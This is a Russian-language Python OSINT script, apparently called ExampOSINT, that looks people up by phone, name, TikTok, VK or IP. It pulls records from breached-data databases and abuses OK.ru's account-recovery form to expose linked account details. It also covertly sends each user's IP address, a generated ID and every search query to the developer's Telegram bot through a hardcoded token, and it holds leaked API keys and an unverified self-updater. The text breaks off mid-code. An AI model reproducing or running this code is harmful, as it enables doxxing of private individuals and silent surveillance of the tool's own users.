current_version = "1.0"
repo_owner = "PidorCoding"
repo_name = "ExampOSINT"
#----
count = 0

import os, subprocess, sys, time, string, threading, platform
MODULES = ["asyncio", "requests", "bs4", "datetime", "pytz", "pystyle", "rich"]
DATA = []

def installation(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])


def LIBS_CHECKER():
    for module in MODULES:
        try:
            __import__(module)
            DATA.append(module)
        except ImportError:
            installation(module)
            
LIBS_CHECKER()




import socket, json, socket, urllib.request, sys, time, hashlib, re, html, ctypes, requests, random, time, base64, asyncio, subprocess, os, webbrowser, platform, threading, pytz, math, curses
#-------------------
from colorama import Style
from bs4 import BeautifulSoup
import datetime
from pystyle import Colors, Box, Write, Center, Colorate
#-------------------

DEVLINK = "https://t.me/xaker1488"

ID_DATA = []

def print_delay(text, delay=0.5):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()
    
def console(text, delay=0.0001):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()
    

def get_time_in_city(city_name):
    try:
        timezone = pytz.timezone(city_name)

        now_utc = pytz.utc.localize(datetime.datetime.utcnow())

        now_city = now_utc.astimezone(timezone)

        formatted_time = now_city.strftime("%H:%M") 

        return formatted_time

    except pytz.exceptions.UnknownTimeZoneError:
        return f"Часовой пояс для города '{city_name}' не найден."
    except Exception as e:
        return f"Произошла ошибка: {e}"

script_name = os.path.basename(__file__)

if __name__ == "__main__":
    city = "Asia/Irkutsk"
    time_in_city = get_time_in_city(city)
    
WHOIS = requests.get("https://api.ipify.org?format=json")
WHOIS.raise_for_status() 
IP_DATA = WHOIS.json()
IP = IP_DATA["ip"]

LOCALTIME = f"{time_in_city}"
RANDINTS = {
random.randint (0,9),
random.randint (0,9),
random.randint (0,9),
random.randint (0,9),
random.randint (0,9),
random.randint (0,9),
random.randint (0,9)
}

while count < 7:
    RANDINT = random.choice(list(RANDINTS)) 
    ID_DATA.append(RANDINT)
    count += 1

ID = "".join(map(str, ID_DATA))

KEY = "ids"

IDUP = re.sub(r'[a-zA-Z.]', '', IP)


if os.path.exists(KEY):
    with open(KEY, 'r') as f:
        ID = f.read()

if os.path.exists(KEY) and os.stat(KEY).st_size == 0:
    with open(KEY, 'w') as f:
        f.write(ID)
elif not os.path.exists(KEY):
    with open(KEY, 'w') as f:
        f.write(ID)

from datetime import datetime, timezone, timedelta
HOURS = datetime.now().strftime("%H")
MIN = datetime.now().strftime("%M")
SEC = datetime.now().strftime("%S")
current_time = datetime.now(timezone.utc)
local_time = current_time.astimezone()

GMTOFFSET = local_time.utcoffset().total_seconds() / 3600 
GMTOFFSET_str = f"{'' if GMTOFFSET >= 0 else ''}{int(GMTOFFSET)}"
GMT = int(GMTOFFSET_str)

HRS = int(HOURS)

log_bot = '8079251100:AAHu09V23BhKrzveNewWIn4yUlCYVlViJzw'
log_rec = '5974477161'



def send_notification(log_bot, log_rec, message): 
    url = f'https://api.telegram.org/bot{log_bot}/sendMessage?chat_id={log_rec}&parse_mode=HTML&text={message}'
    response = requests.post(url)


class Fore:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    PINK = '\033[38;05;181m'
    ORANGE = '\033[38;05;214m'
    VIOLET = '\033[35m'
    CYAN = '\033[36m'
    GREY = '\033[01;38;05;15m'
    BOLD = '\033[1m'
    ITALIC = '\033[03m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
#_________________________

class Bg:
    SHIMMER = '\033[5m'
    REVERSED = '\033[07m'
    RED = '\033[41m'
    GREEN = '\033[42m'
    YELLOW = '\033[43m'
    BLUE = '\033[44m'
    CYAN = '\033[46m'
#_________________________
RESET = '\033[0m'
ERROR = '\033[38;05;196m'
#_________________________

class ANIM:
    def __init__(self):
        self.animation_running = False
        self.start()

    def animation(self):
        animation = [
            f"Пожалуйста, ждите{Fore.BOLD}⠋{RESET}",
            f"{Fore.RED}Пожалуйста, ждите{Fore.BOLD}⠙{RESET}",
            f"{Fore.YELLOW}Пожалуйста, ждите{Fore.BOLD}⠹{RESET}",
            f"{Fore.CYAN}Пожалуйста, ждите{Fore.BOLD}⠸{RESET}",
            f"{Fore.GREEN}Пожалуйста, ждите{Fore.BOLD}⠼{RESET}",
            f"Пожалуйста, ждите{Fore.BOLD}⠴{RESET}",
            f"{Fore.PINK}Пожалуйста, ждите{Fore.BOLD}⠦{RESET}",
            f"{Fore.ORANGE}Пожалуйста, ждите{Fore.BOLD}⠧{RESET}",
            f"{Fore.RED}Пожалуйста, ждите{Fore.BOLD}⠇{RESET}",
            f"{Fore.GREY}Пожалуйста, ждите{Fore.BOLD}⠏{RESET}"
        ]
        self.animation_running = True
        while self.animation_running:
            for i in range(len(animation)):
                time.sleep(0.5)
                sys.stdout.write("\r" + animation[i % len(animation)])
                sys.stdout.flush()
                if not self.animation_running:
                    break

        sys.stdout.write("\r                   ")
        print("\n")
        sys.stdout.flush()


    def start(self):
        ws = threading.Thread(target=self.animation)
        ws.daemon = True
        ws.start()

        time.sleep(3)
        self.animation_running = False
        time.sleep(0.01)
        

def LOGO():
    print(f"{Fore.BOLD}{Fore.RED}Ваш ID: {ID}")
    banner = f"""
{Fore.RED}{Style.BRIGHT.center(80)}
███████╗██╗  ██╗ █████╗ ███╗   ███╗██████╗ 
██╔════╝╚██╗██╔╝██╔══██╗████╗ ████║██╔══██╗
█████╗   ╚███╔╝ ███████║██╔████╔██║██████╔╝
██╔══╝   ██╔██╗ ██╔══██║██║╚██╔╝██║██╔═══╝ 
███████╗██╔╝ ██╗██║  ██║██║ ╚═╝ ██║██║     
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     
                                           
"""
    print(banner)

menu = f"""
{Fore.GREEN}{Style.BRIGHT.center(80)} 
{Fore.GREEN}
               ╔═════════════════════════════════════╗
               ║ {Fore.YELLOW}1. {Fore.GREEN}Поиск по номеру телефона         ║
               ║ {Fore.YELLOW}2. {Fore.GREEN}Поиск по ФИО                     ║
               ║ {Fore.YELLOW}3. {Fore.GREEN}Поиск по TikTok                  ║
               ║ {Fore.YELLOW}4. {Fore.GREEN}Поиск по ВК                      ║
               ║ {Fore.YELLOW}5. {Fore.GREEN}Поиск по айпи                    ║
               ╚═════════════════════════════════════╝

                        {Fore.YELLOW}12. {Fore.RED}Выход
                        {Fore.YELLOW}13. {Fore.RED}Проверить обновления

"""


def MENU(menu):
    

    print(menu)


def CONSOLE_CLEAR():
    try:
        os.system('clear')
    except:
        print("Ошибка: 'pip' не установлен")
        
def INTENT_ACTION_VIEW(DEVLINK):
    if os.path.exists("/data/data/com.termux/files/usr/bin"):
        os.system(f"am start -a android.intent.action.VIEW -d {DEVLINK}")
    else:
        webbrowser.open(DEVLINK)
    
INTENT_ACTION_VIEW(DEVLINK)

CONSOLE_CLEAR()

def check_for_updates(repo_owner, repo_name, current_version):
    url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/releases/latest"
    response = requests.get(url)
    if response.status_code == 200:
        release = response.json()
        latest_version = release['tag_name']
        if latest_version > current_version:
            print(f"Доступно обновление! ")
            release_desc = release['body'] 
            print(f"""
Что нового: 
{release_desc}""")
            conf = input("\nНачать загрузку обновлений? [Y/n]\n")
            if conf == "Y" or "y":
                download_url = release['assets'][0]['browser_download_url']
                download_update(download_url)
                return latest_version
            if conf == "N" or "n":
                sys.exit(1)
        else:
            print("Обновлений не найдено")
            sys.exit(1)
    else:
        print(f"Ошибка проверки обновлений: {response.status_code}")
    return current_version

def download_update(url):
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(script_name, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        conf = input("Обновление загружено. Перезапустить скрипт? [Y/n]\n")
        if conf == "Y" or "y":
            subprocess.run(['python', script_name])
        if cont == "N" or "n":
            sys.exit(1)
        sys.exit()
    else:
        print(f"Ошибка загрузки обновления: {response.status_code}")


def CHECK_INTERNET():
    try:
        urllib.request.urlopen('https://google.com', timeout=7.77)
        return True
    except urllib.error.URLError:
        print(ERROR + Fore.BOLD + "Ошибка: " + "Нет подключения к интернету!")
        sys.exit()
        return False
        
LOGO()
print(script_name)
MENU(menu)


print("")

PASTEBIN = f"https://pastebin.com/YmcR8627"


response = requests.get(PASTEBIN)
        
CHECK_INTERNET()
response.raise_for_status() 

soup = BeautifulSoup(response.content, "html.parser")
text = soup.get_text().lower() 


if ID.lower() in text:
    print(Fore.BOLD + Fore.RED + "Ты был заблокирован!")
    print(f"По всем вопросам, а также по поводу разбана - {Fore.UNDERLINE}t.me/xaker1488")
    log_info = f"""
<b>Лог события</b>
<pre><b>Время:</b> {LOCALTIME}
<b>IP пользователя:</b> <i>{IP}</i>
<b>ID пользователя:</b> <i>{ID}</i>
<b>IDUP:</b> <i>{IDUP}</i>
<b>Запрос:</b> <i>заблокированный пользователь пытался совершить запрос. попытка была отклонена</i>
</pre>"""
    send_notification(log_bot, log_rec, log_info)
    sys.exit(2)
    
if IDUP.lower() in text:
    print(Fore.BOLD + Fore.RED + "Ты был заблокирован!")
    print(f"По всем вопросам, а также по поводу разбана - {Fore.UNDERLINE}t.me/xaker1488")
    log_info = f"""
<b>Лог события</b>
<pre><b>Время:</b> {LOCALTIME}
<b>IP пользователя:</b> <i>{IP}</i>
<b>ID пользователя:</b> <i>{ID}</i>
<b>IDUP:</b> <i>{IDUP}</i>
<b>Запрос:</b> <i>заблокированный пользователь пытался совершить запрос. попытка была отклонена</i>
</pre>"""
    send_notification(log_bot, log_rec, log_info)
    sys.exit(2)

def Input():
    if CHOICE == "1":
        TELCODE = input(Fore.CYAN + "\nВведите телефон: " + Fore.YELLOW)
    if CHOICE == "2":
        TELCODE = input(Fore.CYAN + "\nВведите ФИО: " + Fore.YELLOW)
    if CHOICE == "3":
        TELCODE = input(Fore.CYAN + "\nВведите юзернейм: " + Fore.YELLOW)
    if CHOICE == "4":
        TELCODE = input(Fore.CYAN + "\nВведите ID или ник: " + Fore.YELLOW)
    if CHOICE == "5":
        TELCODE = input(Fore.CYAN + "\nВведите IP: " + Fore.YELLOW)
    if CHOICE == "12":
        TELCODE = None
    if CHOICE == "13":
        TELCODE = None
    elif CHOICE:
        print("Неверный выбор!")
        time.sleep(3)
        subprocess.run(['python', script_name])
        
    return TELCODE
    
def Load():
    
    if __name__ == '__main__':
        ANIM()

    log_info = f"""
<b>Лог события</b>
<pre><b>Время:</b> {LOCALTIME}
<b>IP пользователя:</b> <i>{IP}</i>
<b>ID пользователя:</b> <i>{ID}</i>
<b>IDUP:</b> <i>{IDUP}</i>
<b>Запрос:</b> <i>{BODY}</i>
</pre>

<b>{BODY}</b>
"""

    send_notification(log_bot, log_rec, log_info)
	
TOKENS = {
    "7614128773:9wyfNUGZ"
}



TOKEN = random.choice(list(TOKENS)) 




USERAGENTS = """TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChsaWtlIEdlY2tvKSBDaHJvbWUvOTEuMC40NDcyLjEyNCBTYWZhcmkvNTM3LjM2Ck1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAobGlrZSBHZWNrbykgQ2hyb21lLzg5LjAuNDM4OS44MiBTYWZhcmkvNTM3LjM2Ck1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAobGlrZSBHZWNrbykgQ2hyb21lLzkxLjAuNDQ3Mi4xMjQgU2FmYXJpLzUzNy4zNgpNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUc5NzBGKSBBcHBsZVdlYktpdC81MzcuMzYgKGxpa2UgR2Vja28pIENocm9tZS85MS4wLjQ0NzIuMTIwIE1vYmlsZSBTYWZhcmkvNTM3LjM2Ck1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IHJ2OjU0LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNTQuMApNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzkwLjAKTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTRfNikgQXBwbGVXZWJLaXQvNTM3LjM2IChsaWtlIEdlY2tvKSBDaHJvbWUvODguMC40MzI0LjE4MiBTYWZhcmkvNTM3LjM2Ck1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU00tSjYwMEcpIEFwcGxlV2ViS2l0LzUzNy4zNiAobGlrZSBHZWNrbykgQ2hyb21lLzgwLjAuMzk4Ny44NyBNb2JpbGUgU2FmYXJpLzUzNy4zNgpNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChsaWtlIEdlY2tvKSBDaHJvbWUvODkuMC40Mzg5LjkwIFNhZmFyaS81MzcuMzYKTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNCkgQXBwbGVXZWJLaXQvNTM3LjM2IChsaWtlIEdlY2tvKSBDaHJvbWUvODYuMC40MjQwLjExMSBTYWZhcmkvNTM3LjM2Ck1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgU00tQTc1MEZOKSBBcHBsZVdlYktpdC81MzcuMzYgKGxpa2UgR2Vja28pIENocm9tZS85MS4wLjQ0NzIuNzcgTW9iaWxlIFNhZmFyaS81MzcuMzY="""

USERAGENT = base64.b64decode(USERAGENTS).decode().split("\n")


CHOICE = input(Fore.CYAN + "Введите ваш выбор: " + Fore.YELLOW)

CONSOLE_CLEAR()
LOGO()

headers = {
    "User-Agent": random.choice(USERAGENT)
}

TELCODE = Input()

if TELCODE != None:
    BODY = requests.utils.quote(TELCODE)
    REQUEST_DATA = {"token":(TOKEN), "request":TELCODE, "limit": 100, "lang":"ru"}

if CHOICE == "1":
    
    print("\n\n" + Fore.GREEN + "[" + Fore.CYAN + "<>" + RESET + Fore.GREEN + "]" + Fore.CYAN + "Результаты поиска по номеру телефона:")
    
    Load()
    HTMLWEB_URL = f"https://htmlweb.ru/geo/api.php?json&telcod={TELCODE}"
    
    try:
        response = requests.get(HTMLWEB_URL, headers=headers, timeout=10)
        
        if response.status_code == 200:
            try:
                data = response.json()
                
                TELCOD = data.get("country", {}).get("telcod", "Похоже, вы неверно указали номер")
                COUNTRY = data.get("country", {}).get("fullname", "Неизвестно")
                OKRUG = data.get("okrug", "Неизвестно") 
                OBLAST = data.get("region", {}).get("name", "Неизвестно")
                CITY = data.get("0", {}).get("name", "Неизвестно")
                latitude = data.get("0", {}).get("latitude", "Неизвестно")
                longitude = data.get("0", {}).get("longitude", "Неизвестно")
                TIMEZONE = data.get("0", {}).get("time_zone", data.get("time_zone", "Неизвестно"))
                OPER = data.get("0", {}).get("oper", "Неизвестно")
                VALID = data.get("0", {}).get("mobile", "false")
                
                class LOCAL:
                    TIMEZONE = int(TIMEZONE)
                    
                DATETIME = HRS - GMT + LOCAL.TIMEZONE
                 
                console(Fore.CYAN + f"Источник: " + Fore.GREEN + f"HtmlwebAPI")
                console(Fore.CYAN + f"Описание:{Fore.GREEN} Поиск базовых данных о номере с помощью HLR запроса оператору")
                console("Данные: ")
                console(Fore.CYAN + f" Телефонный код:" + Fore.GREEN + f" +{TELCOD}")
                console(Fore.CYAN + f" Страна:" + Fore.GREEN + f" {COUNTRY}")
                console(Fore.CYAN + f" Округ:" + Fore.GREEN + f" {OKRUG}")
                console(Fore.CYAN + f" Регион:" + Fore.GREEN + f" {OBLAST}")
                console(Fore.CYAN + f" Город:" + Fore.GREEN + f" {CITY}")
                console(Fore.CYAN + f" Широта:" + Fore.GREEN + f" {latitude}")
                console(Fore.CYAN + f" Долгота:" + Fore.GREEN + f" {longitude}")
                console(Fore.CYAN + f" Открыть на карте(Google):" + Fore.GREEN + f" https://www.google.com/maps/place/{latitude} {longitude}")
                console(Fore.CYAN + f" Часовой пояс:" + Fore.GREEN + f" +{TIMEZONE} UTC")
                console(Fore.CYAN + f" Городское время:" + Fore.GREEN + f" {DATETIME}:{MIN}")
                console(Fore.CYAN + f" Оператор:" + Fore.GREEN + f" {OPER}")
                console(Fore.CYAN + f" Валидность:" + Fore.GREEN + f" {VALID}")
                
                
            except ValueError:
                print(ERROR + Fore.BOLD + "Ошибка HTMLWEB: " + "Исчерпан лимит бесплатного количества запросов в сутки для одного IP адреса." + Fore.UNDERLINE + "\nПояснение: Перезайдите в Examp с включенным VPN, что-бы сбросить лимит запросов!" + RESET)
                sys.exit()
                
            except json.JSONDecodeError:
                print(Fore.RED + "Ошибка декодирования JSON." + RESET)
                sys.exit()
        else:
            print(ERROR + Fore.BOLD + f"Ошибка при получении кода страницы. Статус код: {response.status_code}" + Fore.UNDERLINE + f"\nПояснение: возможно страница ({url}) повреждена" + RESET)
            sys.exit()
            
    except requests.exceptions.RequestException as e:
        print(ERROR + Fore.BOLD + f"Ошибка соединения: {e}. Нет подключения к интернету")
        sys.exit()
        
    
    OK_LOGIN_URL = 'https://www.ok.ru/dk?st.cmd=anonymMain&st.accRecovery=on&st.error=errors.password.wrong'
    
    OK_RECOVER_URL = 'https://www.ok.ru/dk?st.cmd=anonymRecoveryAfterFailedLogin&st._aid=LeftColumn_Login_ForgotPassword'
    
    def check_login(TELCODE):
        session = requests.Session()
        session.get(f'{OK_LOGIN_URL}&st.email={TELCODE}')
        request = session.get(OK_RECOVER_URL)
        ROOT_SOUP = BeautifulSoup(request.content, 'html.parser')
        SOUP = ROOT_SOUP.find('div', {'data-l': 'registrationContainer,offer_contact_rest'})
        if SOUP:
            ACCOUNT_INFO = SOUP.find('div', {'class': 'ext-registration_tx taCenter'})
            MASKED_PHONE = SOUP.find('button', {'data-l': 't,phone'})
            if MASKED_PHONE:
                MASKED_PHONE = MASKED_PHONE.find('div', {'class': 'ext-registration_stub_small_header'}).get_text()
            if ACCOUNT_INFO:
                MASKED_NAME = ACCOUNT_INFO.find('div', {'class': 'ext-registration_username_header'})
                if MASKED_NAME:
                    MASKED_NAME = MASKED_NAME.get_text()
                ACCOUNT_INFO = ACCOUNT_INFO.findAll('div', {'class': 'lstp-t'})
                if ACCOUNT_INFO:
                    PROFILE_INFO = ACCOUNT_INFO[0].get_text()
                    PROFILE_REGISTRED = ACCOUNT_INFO[1].get_text()
                else:
                    PROFILE_INFO = None
                    PROFILE_REGISTRED = None
                    
            console(Fore.CYAN + f"Источник: " + Fore.GREEN + f"Ok.ru")
            console(Fore.CYAN + f"Описание:{Fore.GREEN} Поиск профиля сервиса *Одноклассники через форму восстановления аккаунта")
            console("Данные: ")
            console(Fore.CYAN + f" Источник:" + Fore.GREEN + f" Одноклассники")
            console(Fore.CYAN + f" Привязанный номер:" + Fore.GREEN + f" {MASKED_PHONE}")
            console(Fore.CYAN + f" Имя аккаунта:" + Fore.GREEN + f" {MASKED_NAME}")
            console(Fore.CYAN + f" Инфо профиля:" + Fore.GREEN + f" {PROFILE_INFO}")
            console(Fore.CYAN + f" Дата регистрации:" + Fore.GREEN + f" {PROFILE_REGISTRED}")
            
            
            
        if ROOT_SOUP.find('div', {'data-l': 'registrationContainer,home_rest'}):
            return 'not associated'
        else:
            return None
    
    
    
    def process_login(TELCODE):
        RESPONSE = check_login(TELCODE)
    
    def main():
        process_login(TELCODE)
        
    if __name__ == '__main__':
    
        main()
    
    VERIPHONE_URL = f"https://api.veriphone.io/v2/verify?phone={TELCODE}&key=1A85D514E9B04073AC51FA394182728A"
        
    response = requests.get(VERIPHONE_URL, headers=headers, timeout=10)
    
        
    if response.status_code == 200:
        try:
            data = response.json()
            STATUS = data.get("status", "Неизвестно") 
            PHONE = data.get("phone", "Неизвестно") 
            PHONE_VALID = data.get("phone_valid", "Неизвестно")
            PHONE_TYPE = data.get("phone_type", "Неизвестно")
            PHONE_COUNTRY = data.get("phone_region", "Неизвестно")
            LOCAL_NUMBER = data.get("local_number", "Неизвестно")
            CARRIER = data.get("carrier", "Неизвестно")
            
            console(Fore.CYAN + f"Источник: " + Fore.GREEN + f"Veriphone")
            console(Fore.CYAN + f"Описание:{Fore.GREEN} Проверка номера телефона и поиск оператора связи")
            console("Данные: ")
            console(Fore.CYAN + f" Статус ping-sms запроса:" + Fore.GREEN + f" {STATUS}")
            console(Fore.CYAN + f" Телефон:" + Fore.GREEN + f" {PHONE}")
            console(Fore.CYAN + f" Валидность:" + Fore.GREEN + f" {PHONE_VALID}")
            console(Fore.CYAN + f" Тип:" + Fore.GREEN + f" {PHONE_TYPE}")
            console(Fore.CYAN + f" Страна:" + Fore.GREEN + f" {PHONE_COUNTRY}")
            console(Fore.CYAN + f" Локальный номер:" + Fore.GREEN + f" {LOCAL_NUMBER}")
            console(Fore.CYAN + f" Оператор:" + Fore.GREEN + f" {CARRIER}")
            
        except json.JSONDecodeError:
            print(Fore.RED + "Ошибка декодирования JSON." + RESET)
            sys.exit()
    else:
        print(ERROR + Fore.BOLD + f"Ошибка при получении кода страницы. Статус код: {response.status_code}" + Fore.UNDERLINE + f"\nПояснение: возможно страница ({url}) повреждена" + RESET)
        sys.exit()
        
        
    LEAKOSINT_URL = 'https://leakosintapi.com/'
    try:
        response = requests.post(LEAKOSINT_URL, json=REQUEST_DATA)
    
        if response.status_code == 200:
            try:
                result = response.json()
                for db_name, db_info in result.get("List", {}).items():
                    console(Fore.CYAN + f"Источник: " + Fore.GREEN + f"{db_name}")
                    console(Fore.CYAN + f"Описание: " + Fore.GREEN + f"{db_info.get('InfoLeak')}")
                    console(Fore.CYAN + f"Количество записей: " + Fore.GREEN + f"{db_info.get('NumOfResults')}")
                    console("Данные: ")
                    for record in db_info.get("Data", []):
                        for key, value in record.items():
                            console(Fore.CYAN + f" {key}: " + Fore.GREEN + f"{value}")
                            
            except json.JSONDecodeError:
                print(Fore.RED + "Ошибка декодирования JSON." + RESET)
                sys.exit()
        else:
            print(ERROR + Fore.BOLD + f"Ошибка при получении кода страницы. Статус код: {response.status_code}" + Fore.UNDERLINE + f"\nПояснение: возможно страница ({url}) повреждена" + RESET)
            sys.exit()
            
    except requests.exceptions.RequestException as e:
        print(ERROR + Fore.BOLD + f"Ошибка соединения: {e}. Нет подключения к интернету")
        sys.exit()

if CHOICE == "2":
    
    
    print("\n\n" + Fore.GREEN + "[" + Fore.CYAN + "<>" + RESET + Fore.GREEN + "]" + Fore.CYAN + "Результаты поиска по ФИО:")
        
    Load()
    LEAKOSINT_URL = 'https://leakosintapi.com/'
    
    try:
        response = requests.post(LEAKOSINT_URL, json=REQUEST_DATA)
        
        if response.status_code == 200:
            try:
                result = response.json()
                for db_name, db_info in result.get("List", {}).items():
                    console(Fore.CYAN + f"Источник: " + Fore.GREEN + f"{db_name}")
                    console(Fore.CYAN + f"Описание: " + Fore.GREEN + f"{db_info.get('InfoLeak')}")
                    console(Fore.CYAN + f"Количество записей: " + Fore.GREEN + f"{db_info.get('NumOfResults')}")
                    console("Данные: ")
                    for record in db_info.get("Data", []):
                        for key, value in record.items():
                            console(Fore.CYAN + f" {key}: " + Fore.GREEN + f"{value}")
                                
            except json.JSONDecodeError:
                print(Fore.RED + "Ошибка декодирования JSON." + RESET)
                sys.exit()
        else:
            print(ERROR + Fore.BOLD + f"Ошибка при получении кода страницы. Статус код: {response.status_code}" + Fore.UNDERLINE + f"\nПояснение: возможно страница ({url}) повреждена" + RESET)
            sys.exit()
                
    except requests.exceptions.RequestException as e:
        print(ERROR + Fore.BOLD + f"Ошибка соединения: {e}. Нет подключения к интернету")
        sys.exit()

if CHOICE == "3":
    
    
    TIKTOK_URL = f"https://www.tiktok.com/{TELCODE}"
    
    print("\n\n" + Fore.GREEN + "[" + Fore.CYAN + "<>" + RESET + Fore.GREEN + "]" + Fore.CYAN + "Результаты поиска по ТикТок аккаунту:")
    
    Load()
    
    response = requests.get(TIKTOK_URL, headers=headers, timeout=10)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, 'html.parser')
    script_tag = soup.find('script', id='__UNIVERSAL_DATA_FOR_REHYDRATION__', type='application/json')

    if script_tag:
        try:
            json_data = json.loads(script_tag.string)
            user_data = json_data.get('__DEFAULT_SCOPE__', {}).get('webapp.user-detail', {})
            if user_data:
                user_info = user_data.get("userInfo", {})
                user_stats = user_info.get("stats", {})

                account_id = user_info.get("user", {}).get("id", "Неизвестно")
                unique_id = user_info.get("user", {}).get("uniqueId", "Неизвестно")
                nickname = user_info.get("user", {}).get("nickname", "Неизвестно")
                avatar = user_info.get("user", {}).get("avatarLarger", "Неизвестно")
                bios = user_info.get("user", {}).get("signature", "Неизвестно")
                private_account = user_info.get("user", {}).get("privateAccount", "Неизвестно")
                user_country = user_info.get("user", {}).get("region", "Неизвестно")
                account_language = user_info.get("user", {}).get("language", "Неизвестно")
                follower_count = user_stats.get("followerCount", "Неизвестно")
                following_count = user_stats.get("followingCount", "Неизвестно")
                friend_count = user_stats.get("friendCount́", "Неизвестно")
                heart_count = user_stats.get("heartCount", "Неизвестно")
                video_count = user_stats.get("videoCount", "Неизвестно")

                console(Fore.CYAN + f"Источник: " + Fore.GREEN + f"Tiktok")
                console(Fore.CYAN + f"Описание:{Fore.GREEN} Просмотр данных профиля через JavaScript код сайта")
                console("Данные: ")
                console(Fore.CYAN + f" ID аккаунта: {Fore.GREEN}{account_id}")
                console(Fore.CYAN + f" Имя: {Fore.GREEN}{nickname}")
                console(Fore.CYAN + f" Никнейм: @{Fore.GREEN}{unique_id}")
                console(Fore.CYAN + f" Аватар: {Fore.GREEN}{avatar}")
                console(Fore.CYAN + f" Закрытый аккаунт: {Fore.GREEN}{private_account}")
                console(Fore.CYAN + f" Страна: {Fore.GREEN}{user_country}")
                console(Fore.CYAN + f" Язык аккаунта: {Fore.GREEN}{account_language}")
                console(Fore.CYAN + f" Кол-во подписчиков: {Fore.GREEN}{follower_count}")
                console(Fore.CYAN + f" Кол-во подписок: {Fore.GREEN}{following_count}")
                console(Fore.CYAN + f" Кол-во друзей: {Fore.GREEN}{friend_count}")
                console(Fore.CYAN + f" Кол-во видео: {Fore.GREEN}{video_count}")
                console(Fore.CYAN + f" Кол-во лайков: {Fore.GREEN}{heart_count}")
            else:
                print(Fore.RED + "Нет данных пользователя" + Fore.RESET)

        except json.JSONDecodeError:
            print(Fore.RED + "Ошибка декодирования JSON." + Fore.RESET)
            sys.exit()
        except KeyError as e:
            print(Fore.RED + f"Ключ не найден в JSON: {e}" + Fore.RESET)
            sys.exit()
    else:
        print(Fore.RED + "Тег <script> не найден" + Fore.RESET)
        sys.exit()



if CHOICE == "4":
    print("\n\n" + Fore.GREEN + "[" + Fore.CYAN + "<>" + Fore.RESET + Fore.GREEN + "]" + Fore.CYAN + " Результаты поиска по странице ВК:")
    
    Load()
    ONLYVK_URL = f"https://onli-vk.ru/{TELCODE}"
    ONLYVK_FRIENDS_URL = f"https://onli-vk.ru/pivatfriends.php?id={TELCODE}"
    

    try:
        response = requests.get(ONLYVK_URL, headers=headers, timeout=10)
        
        if response.status_code == 200:
            try:
                soup = BeautifulSoup(response.content, 'html.parser')

                status = soup.find('div', {'id': 'profile_online'})
                status = status.text.strip() if status else "Неизвестно"
                
                name_block = soup.find('div', {'id': 'name'})
                name = name_block.text.strip() if name_block else "Неизвестно"
                profile_url = name_block.find('a')['href'] if name_block and name_block.find('a') else "Неизвестно"
                
                console(Fore.CYAN + f"Источник: " + Fore.GREEN + f"Unknown")
                console(Fore.CYAN + f"Описание:{Fore.GREEN} IT-эксперты из компаний Security Discovery и Cybernews обнаружили в сети базу данных на 12 ТБ, содержащую информацию об учётных записях пользователей со всего мира. «Под раздачу» попали Telegram, VK, X, Adobe и другие платформы. Из-за своего гигантского объёма (3800 папок, всего около 26 миллиардов записей) база данных получила неофициальное название Mother Of All Breaches («мать всех утечек»). Уже известно, что она включает информацию о пользователях Tencent и Weibo, а также Twitter, Deezer, Dropbox, Adobe, Canva, VK, Telegram и других ресурсов.")
                console("Данные: ")
                console(Fore.GREEN + f" Онлайн статус: " + Fore.CYAN + f"{status}")
                console(Fore.GREEN + f" Имя профиля: " + Fore.CYAN + f"{name}")
                console(Fore.GREEN + f" Ссылка на профиль: " + Fore.CYAN + f"{profile_url}")

                items_block = soup.find('div', {'id': 'content'})
                if items_block:
                    items = items_block.find_all('a', href=True)
                    
                    unique_clubs = set() 
                    
                    friends = []
                    followers = []
                    clubs = []

                    for item in items:
                        link = item['href']
                        text = item.text.strip()
                        
                        if "vk.com/id" in link or "vk.com/profile" in link:
                            if text:
                                friends.append({"name": text, "link": link})
                        elif "vk.com/public" in link or "vk.com/club" in link:
                            if text and link not in unique_clubs:
                                clubs.append({"name": text, "link": link})
                                unique_clubs.add(link)
                    
                    if friends:
                        print(Fore.CYAN + " Связанные профили: ", end='')
                        for friend in friends:
                            print(Fore.GREEN + f"{friend['name']} - {friend['link']}, ", end='')
                    else:
                        console(Fore.RED + " Не найдено")
                        
                    print("")
                        
                    if clubs:
                        print(Fore.CYAN + " Каналы и Группы:", end='')
                        for club in clubs:
                            print(Fore.GREEN + f" {club['name']} - {club['link']}, ", end='')
                    else:
                        console(Fore.RED + " Клубы не найдены")

                else:
                    console(Fore.RED + " Не удалось найти блок с друзьями, клубами или подписчиками")
            
            except Exception as e:
                console(Fore.RED + f"Ошибка парсинга HTML: {e}" + Fore.RESET)
                sys.exit()
        else:
